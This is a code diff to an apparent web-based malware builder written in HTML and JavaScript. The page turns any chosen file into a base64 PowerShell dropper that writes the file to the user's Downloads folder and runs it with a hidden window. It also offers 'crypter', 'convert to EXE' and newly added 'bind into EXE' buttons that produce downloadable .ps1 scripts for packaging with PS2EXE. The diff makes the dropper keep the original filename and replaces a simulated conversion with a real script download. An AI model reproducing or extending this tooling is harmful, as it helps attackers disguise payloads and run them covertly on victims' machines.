@@ -119,6 +119,7 @@
             <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
             <button id="crypt-button" onclick="createCrypter()">Download Encrypted Script</button>
             <button id="exe-button" onclick="convertPSToEXE()">Convert PS1 to EXE</button>
+            <button id="bind-exe-button" onclick="bindPSToEXE()">Bind PS1 into EXE</button>
         </div>
     </div>
 
@@ -146,8 +147,8 @@
             reader.onload = function(event) {
                 const base64String = event.target.result.split(',')[1];
                 finalPSCode = `
-                $b="${base64String}";[IO.File]::WriteAllBytes("$HOME\Downloads\executable.exe",[Convert]::FromBase64String($b));
-                Start-Process -FilePath "$HOME\Downloads\executable.exe" -WindowStyle Hidden;`;
+                $b="${base64String}";[IO.File]::WriteAllBytes("$HOME\Downloads\${selectedFile.name}",[Convert]::FromBase64String($b));
+                Start-Process -FilePath "$HOME\Downloads\${selectedFile.name}" -WindowStyle Hidden;`;
                 document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
             };
 
@@ -191,30 +192,33 @@
                 return;
             }
 
-            // Use a Web Worker to simulate the conversion process for demonstration purposes
-            const workerCode = `
-                onmessage = function(e) {
-                    const psCode = e.data;
-                    const convertedEXE = "Simulated EXE conversion of: " + psCode;
-                    postMessage(convertedEXE);
-                };
-            `;
-            const blob = new Blob([workerCode], { type: "application/javascript" });
-            const worker = new Worker(URL.createObjectURL(blob));
+            const psFileContent = new Blob([finalPSCode], { type: 'application/octet-stream' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(psFileContent);
+            link.download = 'script.ps1';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
 
-            worker.onmessage = function(e) {
-                const convertedEXE = e.data;
-                const exeBlob = new Blob([convertedEXE], { type: 'application/octet-stream' });
-                const link = document.createElement('a');
-                link.href = URL.createObjectURL(exeBlob);
-                link.download = 'converted_script.exe';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                alert("Converted EXE downloaded to Downloads folder!");
-            };
+            alert("PS1 script downloaded. Use PS2EXE (https://github.com/MScholtes/PS2EXE) to convert the PS1 file to an EXE locally.");
+        }
 
-            worker.postMessage(finalPSCode);
+        function bindPSToEXE() {
+            if (!finalPSCode) {
+                alert("Please generate PowerShell code first.");
+                return;
+            }
+
+            // Generate a file for the PowerShell script
+            const psFileContent = new Blob([finalPSCode], { type: 'application/octet-stream' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(psFileContent);
+            link.download = 'bound_script.ps1';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            alert("PowerShell script downloaded. Use PS2EXE to bind this PS1 script into an EXE file locally.");
         }
     </script>
 
